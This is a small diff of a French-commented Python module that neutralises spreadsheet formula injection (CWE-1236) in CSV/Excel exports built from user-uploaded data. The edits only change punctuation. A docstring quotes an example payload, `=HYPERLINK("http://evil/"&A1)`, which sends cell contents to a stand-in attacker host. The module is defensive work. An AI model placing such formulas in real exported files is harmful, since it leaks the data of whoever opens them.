@@ -1,4 +1,4 @@
-# agent/tools/spreadsheet_safety.py — Garde-fous partagés pour les exports Excel/CSV
+# agent/tools/spreadsheet_safety.py : garde-fous partagés pour les exports Excel/CSV
 #
 # Utilisé à la fois par app_utils.py (mode simple) et
 # agent/output/excel_generator.py (mode agent) : les deux écrivent des
@@ -21,7 +21,7 @@ def _neutralize_value(v):
 def neutralize_formulas(df: pd.DataFrame) -> pd.DataFrame:
     """Empêche l'injection de formule CSV/Excel (CWE-1236).
 
-    Les données réexportées viennent d'un CSV téléversé par l'utilisateur --
+    Les données réexportées viennent d'un CSV téléversé par l'utilisateur :
     une cellule texte commençant par =, +, -, @, tab ou retour chariot est
     interprétée comme une formule par Excel/LibreOffice à l'ouverture
     (ex. `=HYPERLINK("http://evil/"&A1)` peut exfiltrer des données dès
@@ -29,7 +29,7 @@ def neutralize_formulas(df: pd.DataFrame) -> pd.DataFrame:
     convention standard qui force leur traitement en texte.
 
     Couvre aussi les **en-têtes de colonnes** : ce sont, tout autant que les
-    cellules, du texte tel quel du CSV téléversé -- un nom de colonne
+    cellules, du texte tel quel du CSV téléversé. Un nom de colonne
     `=HYPERLINK(...)` réexporté sans y toucher serait tout aussi exploitable
     que la même valeur dans une cellule. Oublié dans la première version de
     cette fonction (seules les valeurs de cellules étaient neutralisées).
